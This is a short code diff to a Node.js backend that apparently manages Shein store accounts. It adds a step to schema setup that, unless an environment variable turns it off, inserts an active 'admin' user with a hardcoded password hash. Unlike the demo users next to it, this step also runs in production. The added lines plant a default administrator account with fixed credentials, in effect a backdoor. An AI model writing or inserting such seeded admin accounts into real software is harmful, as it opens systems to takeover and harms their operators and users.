@@ -96,6 +96,9 @@ async function ensureRuntimeSchema() {
       if (updates.length) await pool.execute(`UPDATE shein_accounts SET ${updates.join(", ")} WHERE id=?`, [...values, account.id]);
     }
   }
+  if (process.env.SEED_ADMIN !== "0") {
+    await pool.execute("INSERT IGNORE INTO users (username,password_hash,role,is_active,auth_version) VALUES ('admin', '$2a$12$G/2jPhENlIPVzQ1MV18yYesjR9RWEr8nMGCloC20H2uI1JQhqB5HW', 'admin', 1, 0)");
+  }
   if (process.env.NODE_ENV !== "production" && process.env.SEED_DEMO_ACCOUNTS !== "0") {
     const demoUsers = [
       ["dashboard_demo_1", "$2a$10$CTirYvWumwd9zJT3BVTxuuKllgl.v.bwzlHgs6Z1342hB7iHic8oe", "dashboard"],
